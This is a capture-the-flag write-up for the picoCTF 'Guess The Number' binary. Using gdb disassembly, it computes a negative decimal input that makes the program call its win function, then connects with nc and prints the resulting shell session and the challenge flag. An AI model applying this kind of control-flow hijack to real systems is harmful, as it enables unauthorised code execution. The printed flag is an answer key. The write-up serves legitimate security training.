**Challenge name:** Guess The Number  
**Description:** Just a simple number-guessing game. How hard could it be? Binary Source. Connect on shell2017.picoctf.com:44930.  
**Hint:**  
What is the program doing with your input number?  
strtol checks for overflow, but it does allow negative numbers...  
**File(s) provided:**  
- guess_num (32-bit ELF)
- guess_num.c (source code)
----
# Step 0: Recon
It looks like the main function accepts a string, transforms it into a number, shifts it right, then tries to jump to the resulting number. The ```win``` function is present again as a target for us to reach.

# Step 1: Setting breakpoint
```gdb
# gdb guess_num -q
Reading symbols from guess_num...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048553 <+0>:	lea    ecx,[esp+0x4]
   0x08048557 <+4>:	and    esp,0xfffffff0
   0x0804855a <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804855d <+10>:	push   ebp
   0x0804855e <+11>:	mov    ebp,esp
   0x08048560 <+13>:	push   ecx
   0x08048561 <+14>:	sub    esp,0x34
   0x08048564 <+17>:	mov    DWORD PTR [ebp-0x2c],0x0
   0x0804856b <+24>:	mov    ecx,0x0
   0x08048570 <+29>:	mov    eax,0x1c
   0x08048575 <+34>:	and    eax,0xfffffffc
   0x08048578 <+37>:	mov    edx,eax
   0x0804857a <+39>:	mov    eax,0x0
   0x0804857f <+44>:	mov    DWORD PTR [ebp+eax*1-0x28],ecx
   0x08048583 <+48>:	add    eax,0x4
   0x08048586 <+51>:	cmp    eax,edx
   0x08048588 <+53>:	jb     0x804857f <main+44>
   0x0804858a <+55>:	mov    eax,ds:0x8049a00
   0x0804858f <+60>:	sub    esp,0x8
   0x08048592 <+63>:	push   0x0
   0x08048594 <+65>:	push   eax
   0x08048595 <+66>:	call   0x80483b0 <setbuf@plt>
   0x0804859a <+71>:	add    esp,0x10
   0x0804859d <+74>:	sub    esp,0xc
   0x080485a0 <+77>:	push   0x80486ec
   0x080485a5 <+82>:	call   0x80483d0 <puts@plt>
   0x080485aa <+87>:	add    esp,0x10
   0x080485ad <+90>:	sub    esp,0xc
   0x080485b0 <+93>:	push   0x8048714
   0x080485b5 <+98>:	call   0x80483d0 <puts@plt>
   0x080485ba <+103>:	add    esp,0x10
   0x080485bd <+106>:	sub    esp,0xc
   0x080485c0 <+109>:	push   0x8048740
   0x080485c5 <+114>:	call   0x80483d0 <puts@plt>
   0x080485ca <+119>:	add    esp,0x10
   0x080485cd <+122>:	sub    esp,0xc
   0x080485d0 <+125>:	push   0x8048761
   0x080485d5 <+130>:	call   0x80483c0 <printf@plt>
   0x080485da <+135>:	add    esp,0x10
   0x080485dd <+138>:	sub    esp,0x8
   0x080485e0 <+141>:	lea    eax,[ebp-0x2c]
   0x080485e3 <+144>:	push   eax
---Type <return> to continue, or q <return> to quit---
   0x080485e4 <+145>:	push   0x8048775
   0x080485e9 <+150>:	call   0x8048410 <__isoc99_scanf@plt>
   0x080485ee <+155>:	add    esp,0x10
   0x080485f1 <+158>:	sub    esp,0x4
   0x080485f4 <+161>:	push   0xa
   0x080485f6 <+163>:	push   0x0
   0x080485f8 <+165>:	lea    eax,[ebp-0x2c]
   0x080485fb <+168>:	push   eax
   0x080485fc <+169>:	call   0x8048420 <strtol@plt>
   0x08048601 <+174>:	add    esp,0x10
   0x08048604 <+177>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048607 <+180>:	sub    esp,0x8
   0x0804860a <+183>:	push   DWORD PTR [ebp-0xc]
   0x0804860d <+186>:	push   0x804877c
   0x08048612 <+191>:	call   0x80483c0 <printf@plt>
   0x08048617 <+196>:	add    esp,0x10
   0x0804861a <+199>:	shr    DWORD PTR [ebp-0xc],0x4
   0x0804861e <+203>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048621 <+206>:	call   eax
   0x08048623 <+208>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048626 <+211>:	leave  
   0x08048627 <+212>:	lea    esp,[ecx-0x4]
   0x0804862a <+215>:	ret    
End of assembler dump.
(gdb) break *0x08048621
Breakpoint 1 at 0x8048621
```
# Step 2: Find target address:
```gdb
(gdb) disas win
Dump of assembler code for function win:
   0x0804852b <+0>:	push   ebp
...
```
# Step 3: Calculate input
The program works like this:  
1) Accept a decimal number (let's call this ```input```)  
2) Which is be stored as bytes (let's call this ```temp```)  
3) This value is then shift right by 4 bits (let's call this ```target```) and is then jumped to  

Working backwards makes the most sense in this situation. Clearly our target is ```0x0804852b```.  
This means temp should be ```0x804852b0``` (shifted left 4 bits).
Finally, we need to know what decimal number to enter to get this ```temp``` value in memory. 

We can use gdb to place that value on the stack and just read it out in decimal form:
```gdb
(gdb) x/x $esp
0xffffcbf8:	0xffffcc48
(gdb) set *0xffffcbf8 = 0x804852b0
(gdb) print *0xffffcbf8
$1 = -2142743888
```
Our input has to be ```-2142743888```.
# Step 4: Get flag
``` bash
# nc shell2017.picoctf.com 44930
Welcome to the number guessing game!
I'm thinking of a number. Can you guess it?
Guess right and you get a shell!
Enter your number: -2142743888
You entered -2142743888. Let's see if it was right...
Congratulations! Have a shell:
/bin/sh: 0: can't access tty; job control turned off
$ ls
flag.txt
guess_num
xinetd_wrapper.sh
$ cat flag.txt	
55b6b9591d1781061f859a010a8fe0ef
```
